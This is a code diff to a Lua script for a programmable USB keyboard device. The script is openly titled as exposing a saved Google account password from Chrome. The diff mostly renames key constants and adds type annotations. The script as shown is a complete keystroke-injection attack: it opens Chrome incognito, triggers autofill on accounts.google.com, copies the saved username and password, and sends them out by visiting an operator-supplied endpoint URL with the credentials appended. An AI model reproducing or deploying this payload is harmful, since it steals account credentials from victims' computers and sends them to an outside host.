@@ -1,9 +1,11 @@
 ---
 --- Expose saved Google account password from Chrome
 ---
+--- @module "meta"
+
 require("common")
 
-kb = luausb.create({ type = "keyboard" })
+local kb = luausb.create({ type = "keyboard" }) --[[@as KeyboardDev]]
 
 -- This URL will be visited with the captured password appended to the end
 local endpoint = prompt{
@@ -17,11 +19,11 @@ while true do
 
     -- poll until usb plugged in
     wait_for_state("configured")
-    wait_for_detect(kb)
+    wait_for_detect(kb --[[@as KeyboardDev]])
     print("running")
 
     -- open chrome
-    kb:chord(MOD_LSUPER, KEY_R)
+    kb:chord(Keyboard.Mod.LSUPER, Keyboard.Key.R)
     wait(1000)
     kb:string("chrome --incognito\n")
     wait(2000)
@@ -29,44 +31,44 @@ while true do
     -- navigate to login page
     kb:string("accounts.google.com")
     -- get rid of any autofill that appears in the omnibar
-    kb:press(KEY_DELETE)
-    kb:press(KEY_ENTER)
+    kb:press(Keyboard.Key.DELETE)
+    kb:press(Keyboard.Key.ENTER)
     wait(2000)
 
     -- autofill username and continue
-    kb:press(KEY_DOWN);             wait(100)
-    kb:press(KEY_DOWN);             wait(100)
-    kb:press(KEY_ENTER);            wait(100)
-    kb:chord(MOD_LCTRL, KEY_A);     wait(100)
-    kb:chord(MOD_LCTRL, KEY_C);     wait(100)
-    kb:press(KEY_ENTER)
+    kb:press(Keyboard.Key.DOWN);             wait(100)
+    kb:press(Keyboard.Key.DOWN);             wait(100)
+    kb:press(Keyboard.Key.ENTER);            wait(100)
+    kb:chord(Keyboard.Mod.LCTRL, Keyboard.Key.A);     wait(100)
+    kb:chord(Keyboard.Mod.LCTRL, Keyboard.Key.C);     wait(100)
+    kb:press(Keyboard.Key.ENTER)
     wait(4000)
 
     -- autofill password
-    kb:press(KEY_TAB);              wait(100)
-    kb:press(KEY_SPACE);            wait(100)
-    kb:chord(MOD_LSHIFT, KEY_TAB);  wait(100)
-    kb:press(KEY_LEFT);             wait(100)
-    kb:chord(MOD_LCTRL, KEY_V);     wait(100)
+    kb:press(Keyboard.Key.TAB);              wait(100)
+    kb:press(Keyboard.Key.SPACE);            wait(100)
+    kb:chord(Keyboard.Mod.LSHIFT, Keyboard.Key.TAB);  wait(100)
+    kb:press(Keyboard.Key.LEFT);             wait(100)
+    kb:chord(Keyboard.Mod.LCTRL, Keyboard.Key.V);     wait(100)
     kb:string("|");                 wait(100)
-    kb:chord(MOD_LCTRL, KEY_A);     wait(100)
-    kb:chord(MOD_LCTRL, KEY_C)
+    kb:chord(Keyboard.Mod.LCTRL, Keyboard.Key.A);     wait(100)
+    kb:chord(Keyboard.Mod.LCTRL, Keyboard.Key.C)
     wait(100)
 
     -- open new tab and navigate to query string with captured password
-    kb:chord(MOD_LCTRL, KEY_T)
+    kb:chord(Keyboard.Mod.LCTRL, Keyboard.Key.T)
     wait(1000)
     kb:string(endpoint)
-    kb:chord(MOD_LCTRL, KEY_V)
-    kb:press(KEY_ENTER)
+    kb:chord(Keyboard.Mod.LCTRL, Keyboard.Key.V)
+    kb:press(Keyboard.Key.ENTER)
     wait(4000)
 
     -- close everything we opened
-    kb:chord(MOD_LALT, KEY_F4)
+    kb:chord(Keyboard.Mod.LALT, Keyboard.Key.F4)
     wait(1000)
 
     print("done")
-    wait_for_state("not attached")
+    wait_for_state("not-attached")
 
     print("disconnected")
 end
